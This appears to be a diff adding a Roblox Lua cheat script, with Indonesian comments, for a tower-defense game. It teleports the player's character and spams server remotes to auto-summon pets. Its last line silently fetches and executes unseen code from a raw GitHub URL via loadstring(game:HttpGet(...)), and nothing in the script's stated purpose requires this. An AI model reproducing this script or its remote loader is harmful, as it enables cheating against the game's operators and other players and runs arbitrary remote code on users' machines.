@@ -1,0 +1,118 @@
+-- Konfigurasi Hologram Pathway
+local hologramColor = Color3.fromRGB(255, 255, 255) -- Warna putih
+local hologramTransparency = 0.5 -- Transparansi hologram (0 = opaque, 1 = transparan)
+
+-- Konfigurasi Summon Pet
+local petName = "Nightguard Afton" -- Nama pet yang akan disummon
+local summonCount = 10 -- Jumlah pet yang akan disummon 
+local summonRadiusX = 5 -- Radius acak X (mengatur area summon persegi panjang)
+local summonRadiusZ = 7 -- Radius acak Z (mengatur area summon persegi panjang)
+local summonDelay = 2 -- Jeda antar summon dalam detik
+local proximityToPath = 3 -- Jarak minimum dari pathways untuk posisi summon
+
+-- Konfigurasi Visual Indicator
+local indicatorColor = "Bright blue" -- Warna visual indicator
+local indicatorTransparency = 0.7 -- Transparansi visual indicator
+
+-- Path awal: Jalan Panjang Tengah
+local startPath1 = "3" -- Nama path pertama
+local startPath2 = "2" -- Nama path kedua
+
+-- Setup Hologram Pathways
+local pathwayFolder = game.Workspace.Map.Pathways
+
+for _, pathwayPart in ipairs(pathwayFolder:GetChildren()) do
+    if pathwayPart:IsA("Part") then
+        local hologram = pathwayPart:Clone()
+        hologram.Name = pathwayPart.Name .. "_Hologram"
+        hologram.CanCollide = false
+        hologram.Transparency = hologramTransparency
+        hologram.BrickColor = BrickColor.new(hologramColor)
+        hologram.Position = pathwayPart.Position + Vector3.new(0, 0.1, 0)
+        hologram.Parent = pathwayFolder
+    end
+end
+
+-- Script summon pet
+wait(1)
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local part1 = workspace.Map:WaitForChild("Paths"):WaitForChild(startPath1):WaitForChild(startPath2)
+local part2 = workspace.Map:WaitForChild("Paths"):WaitForChild(startPath1):WaitForChild("3")
+local middlePosition = (part1.Position + part2.Position) / 2
+character.HumanoidRootPart.CFrame = CFrame.new(middlePosition)
+
+local visualIndicator = Instance.new("Part")
+visualIndicator.Size = Vector3.new(summonRadiusX * 2, 0.1, summonRadiusZ * 2)
+visualIndicator.Anchored = true
+visualIndicator.CanCollide = false
+visualIndicator.BrickColor = BrickColor.new(indicatorColor)
+visualIndicator.Transparency = indicatorTransparency
+visualIndicator.Parent = workspace
+
+local function updateVisualIndicator()
+    while true do
+        visualIndicator.Position = character.HumanoidRootPart.Position + Vector3.new(0, -0.5, 0)
+        wait(0.1)
+    end
+end
+spawn(updateVisualIndicator)
+
+local usedPositions = {}
+
+local function isPositionUsed(position)
+    for _, pos in pairs(usedPositions) do
+        if (pos - position).magnitude < 3 then
+            return true
+        end
+    end
+    return false
+end
+
+-- Fungsi mengecek apakah posisi terlalu dekat dengan pathways
+local function isTooCloseToPath(position)
+    for _, pathwayPart in ipairs(pathwayFolder:GetChildren()) do
+        if pathwayPart:IsA("Part") then
+            if (pathwayPart.Position - position).magnitude < proximityToPath then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+-- Loop summon pet
+for i = 1, summonCount do
+    local argsReset = { [1] = "Reset" }
+    game:GetService("ReplicatedStorage").Remotes.Misc.StopSettings:FireServer(unpack(argsReset))
+
+    for j = 1, 68 do
+        game:GetService("ReplicatedStorage").Remotes.Misc.StopSettings:FireServer()
+    end
+
+    for attempt = 1, 100 do
+        local randomX = math.random(-summonRadiusX, summonRadiusX)
+        local randomZ = math.random(-summonRadiusZ, summonRadiusZ)
+        local newPosition = character.HumanoidRootPart.Position + Vector3.new(randomX, 0, randomZ)
+
+        if not isPositionUsed(newPosition) and not isTooCloseToPath(newPosition) then
+            table.insert(usedPositions, newPosition)
+
+            local argsSummon = {
+                [1] = petName,
+                [2] = CFrame.new(newPosition)
+            }
+
+            game:GetService("ReplicatedStorage").Remotes.Towers.SummonTower:FireServer(unpack(argsSummon))
+            wait(summonDelay)
+            break
+        end
+    end
+end
+
+-- Teleport ke lokasi awal setelah semua summon selesai
+character.HumanoidRootPart.CFrame = CFrame.new(middlePosition)  -- menggunakan middlePosition yang sudah dihitung sebelumnya
+
+repeat task.wait() until game:IsLoaded()
+wait(1) -- waktu tunggu
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LocasTheBoys/efentedehuy/refs/heads/main/cocoktanemv2"))()
